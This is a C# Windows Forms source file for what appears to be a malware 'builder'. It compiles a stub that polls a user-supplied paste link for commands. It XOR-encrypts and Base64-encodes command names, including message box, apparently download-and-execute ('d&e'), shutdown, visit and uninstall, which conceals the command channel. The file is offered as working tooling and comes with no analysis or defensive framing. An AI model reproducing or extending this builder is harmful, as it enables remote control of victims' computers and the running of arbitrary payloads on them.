using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Builder
{
    public partial class Form1 : Form
    {
        public static string GetUniqueUSG(int maxSize)
        {
            char[] chars = new char[62];
            chars =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
            byte[] data = new byte[1];
            RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider();
            crypto.GetNonZeroBytes(data);
            data = new byte[maxSize];
            crypto.GetNonZeroBytes(data);
            StringBuilder result = new StringBuilder(maxSize);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return result.ToString();
        }
        public Form1()
        {
            InitializeComponent();
        }
        string EncryptOrDecrypt(string text, string key)
        {
            var result = new StringBuilder();

            for (int c = 0; c < text.Length; c++)
                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));

            return result.ToString();
        }
        private void btnBuild_Click(object sender, EventArgs e)
        {
            SaveFileDialog s = new SaveFileDialog();
            s.Filter = "Executables|*.exe";
            if (s.ShowDialog() == DialogResult.OK)
            {
                string key = GetUniqueUSG(32);
                string stub = Properties.Resources.stub;
                stub = stub.Replace("[key-replace]", key);
                stub = stub.Replace("[pastelink-replace]", txtURL.Text);
                DirectText.Compilier.CompileFromSource(stub, s.FileName, null, null);
                string textbox = Properties.Resources.textbox;
                
                textbox = textbox.Replace("[msg-box]", ToBase(EncryptOrDecrypt("msgbox", key)));
                textbox = textbox.Replace("[d&e]", ToBase(EncryptOrDecrypt("d&e", key)));
                textbox = textbox.Replace("[shutdown]", ToBase(EncryptOrDecrypt("shutdown", key)));
                textbox = textbox.Replace("[visit]", ToBase(EncryptOrDecrypt("visit", key)));
                textbox = textbox.Replace("[uninstall]", ToBase(EncryptOrDecrypt("uninstall", key)));
                txtComs.Text = textbox;
                File.WriteAllText("currentcommands.txt", textbox);
            }
        }
        static string ToBase(string enc)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(enc));
        }
    }
}
